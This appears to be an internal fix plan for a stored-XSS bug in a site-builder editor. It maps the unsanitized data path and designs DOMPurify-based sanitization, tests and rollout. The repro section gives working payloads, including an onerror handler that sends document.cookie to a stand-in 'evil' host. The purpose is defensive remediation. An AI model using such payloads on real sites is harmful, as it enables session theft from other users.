# Fix: Editor XSS — sanitize-at-boundary

- **Date:** 2026-06-07
- **Scope:** `packages/editor/src` (client). Server partner-fix flagged, out of scope here.
- **Origin:** Codex audit 2026-06-07 (security finding #1) → verified via `xss-boundary-map` workflow (6 agents, every hop confirmed in real code).
- **Verdict from adversarial verifier:** `exploitable=true`, confidence **medium**. Real stored-XSS crossing an intra-workspace privilege boundary (EDITOR → OWNER). 3 higher-severity vectors were actively disproven (see "Disproven" below) — do not chase them.

---

## 1. The verified bug

The editor has a working HTML sanitizer (`shared/utils/html/sanitization.ts:125` `sanitizeHTML`) — it strips `on*` handlers and blocks `javascript:`/`vbscript:`. It is wired into exactly ONE place: the raw-HTML-string import (`engine/elements/manager/HTMLParser.ts:142`). **Every other path that produces canvas HTML bypasses it.**

### Exploitable chain (each hop confirmed)

1. **Source (unsanitized):** A site loads via `services/BuildrikSyncProvider.ts:187-189` — `page.root = p.blocks` taken verbatim from the dashboard Json column with only an object-shape check. Server write schema is `blocks: z.unknown()` (`packages/shared/schemas/sites.ts:146`, `pages.ts:16`) — no node sanitization at write. localStorage path is identical (`engine/storage/StorageAdapter.ts:167-173` raw `JSON.parse`).
2. **Into the tree, no sanitizer:** `importProject` (`engine/Composer.ts:449-461`) → `PageManager.importPage` (`:346-354`) → `ElementManager.buildElementTree` (`:241`) → `new Element(data)` stores `this.data = data` verbatim. `sanitizeHTML` is never called.
3. **Serializer emits raw:** `composer.elements.toHTML()` → `elementDataToHTML`/`buildAttributeString` (`shared/utils/html/generation.ts:77-88, 135`). Attribute **names** emitted verbatim (`onerror` survives — `escapeAttr` only entity-escapes values, `encoding.ts:67-69`); `content` interpolated **raw** at `generation.ts:135`.
4. **Render chain, no re-sanitize:** `useCanvasSync.ts:33` → `useCanvasContent.ts:33-49` (DOMParser parse+reserialize — NOT sanitization; the `Canvas.tsx:326-327` comment calling it "already the sanitized editor source" is **false** for the JSON path).
5. **Sink:** `Canvas.tsx:465` `dangerouslySetInnerHTML` on the `buildrick-canvas` div. No sandbox iframe — mounts into the editor's same-origin document.

### Minimal repro (verified payload)

A workspace EDITOR persists a page blocks node:
```json
{ "id":"el1", "type":"image", "tagName":"img",
  "attributes": { "src":"x", "onerror":"alert(document.domain)" } }
```
or content-based:
```json
{ "id":"el1", "type":"container", "tagName":"div",
  "content":"<img src=x onerror=\"fetch('//evil/c?'+document.cookie)\">" }
```
A different member (OWNER) opens the site → `loadProject` → `importProject` → `toHTML()` emits raw `<img … onerror>` → `Canvas.tsx:465` mounts it → `onerror` fires in the victim's authenticated session. (A bare `<script>` does NOT fire via `innerHTML`; the working primitive is an event-handler attribute or `onerror`/`onload`.)

### Secondary path: inline-edit self-store round-trip

- `useCanvasInlineEdit.ts:137` reads `el.innerHTML` (raw) on blur → `setContent(newHtml)` (`:141`) → `Element.ts:126` stores raw → re-emitted raw by `toHTML`. Pasted/typed markup persists.
- `useCanvasInlineCommands.ts:92` `createLink` sets `link.href = value` from a free-text input (`RichTextEditor.tsx:42-43`) with **no scheme check** → `href="javascript:…"` injectable.

---

## 2. Severity & urgency (honest framing)

- **Not** an anonymous-internet-attacker bug. Delivery requires workspace write access (EDITOR+), and any member can already inject `customCode.headScripts` (raw `<script>`) into the published site. That caps practical severity at **medium today**.
- **Urgency is the trajectory:** the collab arc (next scope) makes multi-member editing routine, which turns the EDITOR→OWNER vector from theoretical to everyday. Fixing before collab ships is the right sequencing.

---

## 3. Disproven vectors (do NOT implement defenses for these)

The verifier confirmed these are not reachable; building guards for them is wasted work:

- **Global templates:** `templatesRouter` exposes only `list/get/use/generate`; no user mutation creates a `Template.blocks` row. Admin-seeded only.
- **CMS-binding `setAttribute` default branch** (`useCMSPreview.ts:74-76`): the only UI caller hardcodes `property:"content"` + `itemId:undefined` → `resolveBinding` returns the empty fallback. CMS bindings/content are never serialized into project JSON; CMS data lives in same-origin IndexedDB. Not attacker-deliverable.
- **`/share/[token]` page:** password gate redirecting to the published Vercel site — no `dangerouslySetInnerHTML` of blocks. No unauthenticated cross-tenant editor render.

---

## 4. Design: enforce one invariant at two boundaries + safe-by-construction serializer

**Invariant:** *Any `ElementData.content` in the element tree is already sanitized HTML, and the serializer can never emit a dangerous attribute name or URL scheme.*

Enforce it in three cheap places instead of sanitizing the whole document on every render (which would worsen the known render-perf P1):

| Layer | Where | What | Cost |
|-------|-------|------|------|
| **A. Serializer hardening** | `shared/utils/html/generation.ts` `buildAttributeString` | Attribute-name allowlist: drop `on*` and any non-allowlisted name; run `href`/`src`/`action`/`xlink:href`/`formaction` through scheme validation. Safe-by-construction for attributes. | Per-render but trivial string ops |
| **B. Ingest sanitize (the trust boundary)** | `engine/Composer.ts` `importProject` / `buildElementTree` | Walk each imported node; run `content` through `sanitizeHTML`. One-time per load. Covers localStorage + dashboard + `TemplateManager.loadTemplate` (which also routes through `importProject`). | Once per project load |
| **C. Write-time sanitize** | `useCanvasInlineEdit` (finishEdit), `useCanvasInlineCommands` (createLink) | Sanitize `innerHTML` before `setContent`; validate link `href` scheme. Covers user self-edit/paste that bypasses ingest. | Once per edit commit |

Because A makes attributes safe-by-construction and B+C keep stored `content` always-sanitized, the render path (`useCanvasContent` → `Canvas.tsx:465`) needs **no** per-render full-document sanitize. A render-boundary sanitize is explicitly rejected here on perf grounds (full-HTML regen is already a known P1 bottleneck).

### SSOT consolidation

Today there are three sanitizers with divergent rules. Collapse to one:
- **Adopt DOMPurify** (`dompurify@^3.3.1`, already a dep; `import DOMPurify from 'dompurify'` confirmed working in this Vite bundle) as the single engine sanitizer, configured editor-aware.
- **Critical config constraint:** the canvas depends on `data-buildrick-*`, `style`, `class`, `id`, `role` for selection/overlay/CMS. DOMPurify config MUST `ADD_ATTR`/allow `data-*` + `style` + `class` (mirror `resolveTemplateTokens.ts:61` which already does `ADD_ATTR: ['data-buildrick-id']`), or selection breaks. Verify in the editor after the swap.
- **Fix the scheme gaps** the hand-rolled config has that DOMPurify closes by default: `data:` currently allowed except `data:text/html` (`sanitizationConfig.ts:257`); `xlink:href` not URL-validated; un-anchored `javascript:` substring regex.
- **Delete** the dead `shared/utils/parsers/htmlParser.ts` `sanitizeHTML` (no live runtime caller found) and re-point any test-only imports.
- **Reconcile** `AICopilot.tsx:110` to the same shared sanitizer (it has a third narrower allowlist).

---

## 5. Task breakdown (ordered)

> Solo workflow, direct to main (per project memory). Each task = one commit, type-check + targeted tests green before the next.

**T1 — Single DOMPurify-based sanitizer with editor-aware config.**
- Rewrite `shared/utils/html/sanitization.ts` `sanitizeHTML` to wrap DOMPurify with a configured instance: allow the editor tag/attr set, force-allow `data-*` + `style` + `class` + `id` + `role`, forbid `on*`, restrict URL schemes to `http/https/mailto/tel` + `data:image/*` only (drop `data:text/html` and other `data:`), validate `xlink:href`.
- Keep the existing `sanitizeHTML(html, options)` signature so `HTMLParser.ts:142` and `blockRegistry.ts:228` callers are unchanged.
- Acceptance: existing `svgSanitize` / `sanitizeHeadCode` tests still green; new `sanitization.test.ts` proves `onerror`/`onload`/`javascript:`/`data:text/html`/`xlink:href javascript:` are stripped while `data-buildrick-id`/`style`/`class` survive.

**T2 — Harden the serializer (safe-by-construction attributes).**
- `shared/utils/html/generation.ts` `buildAttributeString`: drop attribute names matching `/^on/i` and any name not in an allowlist (reuse the sanitizer's attr allowlist as SSOT — export it from `sanitizationConfig.ts`); for `href`/`src`/`action`/`xlink:href`/`formaction` run the value through the shared `isSafeUrl`.
- Acceptance: new `generation.test.ts` — an `ElementData` with `attributes:{onerror:…}` or `href:"javascript:…"` serializes to HTML with those removed; `data-*`/`style` retained.

**T3 — Sanitize content at the ingest boundary.**
- `engine/Composer.ts` `importProject` (or `ElementManager.buildElementTree`): for each node, if `content` is a non-empty string, replace with `sanitizeHTML(content)`. Applies to localStorage, dashboard (`BuildrikSyncProvider`), and `TemplateManager.loadTemplate`/`mergeTemplate` (all funnel through `importProject`).
- Acceptance: new `importProject.security.test.ts` — importing a project whose node `content` is `<img src=x onerror=…>` yields a tree whose `toHTML()` contains no `onerror`.

**T4 — Sanitize the inline-edit write path.**
- `useCanvasInlineEdit.ts` finishEdit (`:137`): `sanitizeHTML(el.innerHTML)` before `setContent`. Cancel restore (`:151`) — restore from the sanitized stored content, not raw live DOM.
- `useCanvasInlineCommands.ts` `createLink` (`:92`): validate `value` with `isSafeUrl` before assigning `href`; reject/strip on fail.
- Acceptance: live walk (keystrokes, not `execCommand`, per memory `feedback_execcommand_bypass_artifact`) — paste `<img onerror>` into a text element, blur, reload → no execution; typing `javascript:` into the link field is rejected.

**T5 — SSOT cleanup.**
- Delete dead `shared/utils/parsers/htmlParser.ts` `sanitizeHTML` (confirm zero live callers first — grep), re-point test imports.
- Point `AICopilot.tsx:110` at the shared sanitizer (or document why its allowlist must stay narrower).
- Acceptance: `gate:ds-ssot` style grep shows one sanitizer module; build green.

**T6 — Verify the canvas still works.**
- Live-verify in the running editor (port 5050): selection, overlays, drag, CMS preview, inline edit all intact after the DOMPurify swap (the `data-buildrick-*`/`style` preservation is the risk). Screenshot before/after.

---

## 6. Tests (none exist for these paths today)

- `sanitization.test.ts` — DOMPurify config: strips `on*`, `javascript:`, `data:text/html`, bad `xlink:href`; preserves `data-buildrick-*`, `style`, `class`.
- `generation.test.ts` — `buildAttributeString` attribute-name + URL-scheme safety.
- `importProject.security.test.ts` — ingest sanitizes node `content`.
- Inline-edit live walk (manual, screenshot evidence) — keystroke-driven, not `execCommand`.

---

## 7. Out of scope (flagged partner-fixes)

- **Secrets in cleartext localStorage** (Codex finding #2): `exportProject` (`Composer.ts:495`) writes `integrations.email.apiKey`, `stripe.publishableKey`, `publishing.publishedPassword`, `customCode` scripts into localStorage JSON (`StorageAdapter.ts:176-178`). Separate concern — strip sensitive settings from the client export. Recommend as the next plan.
- **Server-side `blocks: z.unknown()`** (`packages/shared/schemas/sites.ts:146`, `pages.ts:16`): the other half of defense-in-depth — validate/sanitize blocks at write in the dashboard service. Cross-package; out of editor scope but the durable fix. (Memory: `feedback_inventory_must_cross_packages` — the editor fix alone is client-trust-only.)

---

## 8. Rollout

- Direct to main, one commit per task, type-check (`npx tsc --noEmit`) + targeted Vitest green each step.
- T6 live-walk is the ship gate — the DOMPurify swap can silently break canvas selection if `data-*`/`style` preservation regresses (memory: `feedback_audit_by_file_presence_unreliable` — live-verify mandatory for UI parity).
- Commit footer per project convention.
